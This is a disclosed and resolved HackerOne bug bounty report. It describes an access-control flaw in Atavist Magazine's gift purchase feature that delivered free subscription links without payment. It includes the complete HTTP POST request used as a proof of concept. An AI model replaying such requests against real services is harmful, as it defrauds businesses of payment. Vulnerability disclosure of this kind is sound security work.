---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '951230'
original_report_id: '951230'
title: Can buy Atavist Magazine subscription for free
weakness: Improper Access Control - Generic
team_handle: automattic
created_at: '2020-08-04T20:24:21.920Z'
disclosed_at: '2020-11-18T14:21:37.932Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 26
tags:
- hackerone
- improper-access-control-generic
---

# Can buy Atavist Magazine subscription for free

## Metadata

- HackerOne Report ID: 951230
- Weakness: Improper Access Control - Generic
- Program: automattic
- Disclosed At: 2020-11-18T14:21:37.932Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hi team
If you go to https://magazine.atavist.com/ and scroll down. You will see membership price is $25, but I found a way to buy this subscription for free via Gift feature.
When you send gift request before adding any credit card to your account you will see this response :

{F936531}

However, if you check the gift recipient's email you will see the Gift email that contains the gift link.

{F936533}

## Steps To Reproduce:

  1. Just send this request (change `YOUR_EMAIL`, `YOUR_PASSWORD`, `RECIPIENT_EMAIL`, `gift_timestamp to current date, it was 2020-8-4 while reporting this`)  :

```http
POST /api/v2/store/purchase.php HTTP/1.1
Host: magazine.atavist.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 204
Origin: https://magazine.atavist.com
DNT: 1
Connection: close
Referer: https://magazine.atavist.com/

email=YOUR_EMAIL&password=YOUR_PASSWORD&product_id=com.theatavist.atavist.subscription.membership&gift_timestamp=2020-8-4&gift_recipient=RECIPIENT_EMAIL&gift_message=test&gift_gifter=test
```

You will see `{"error":"invalid_request_error","error_description":"The customer must have an active payment source attached."}` in response but if you check the recipient's email, you will see the gift link.

## Impact

Able to buy magazine membership for free

Thanks,
Bugra

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
